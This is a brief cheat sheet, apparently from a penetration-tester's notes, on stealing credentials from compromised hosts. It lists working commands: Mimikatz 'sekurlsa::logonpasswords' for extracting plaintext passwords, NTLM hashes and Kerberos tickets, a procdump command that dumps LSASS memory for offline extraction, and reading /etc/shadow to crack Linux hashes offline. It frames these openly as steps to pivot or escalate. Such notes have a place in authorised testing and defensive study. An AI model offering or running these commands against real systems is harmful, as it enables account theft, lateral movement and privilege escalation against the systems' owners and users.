# Credential Access - OS Credential Dumping

Stealing account names/passwords/hashes from a compromised host, to pivot or escalate.

### Mimikatz (Windows)

Extracts plaintext passwords, NTLM hashes, Kerberos tickets, and certs from Windows memory.

* **Extract Passwords (plaintext, hashes, Kerberos):**

    ```powershell
    privilege::debug
    sekurlsa::logonpasswords
    ```

### LSASS Dump (Windows)

LSASS holds credentials in memory. Dump the process, extract offline.

* **Dump LSASS process for offline credential extraction:**

    ```powershell
    procdump.exe -accepteula -ma lsass.exe lsass.dmp
    ```

    *Note: `procdump.exe` is a Sysinternals tool. The `-accepteula` flag accepts the EULA, and `-ma` performs a full memory dump.*

### Password Hashes (Linux)

Hashes live in `/etc/shadow`, root-only. Read it, crack offline.

* **Locate and read `/etc/shadow` (requires root):**

    ```bash
    cat /etc/shadow
    ```

For more detailed Mimikatz usage, refer to the `Tools/Mimikatz.md` documentation.
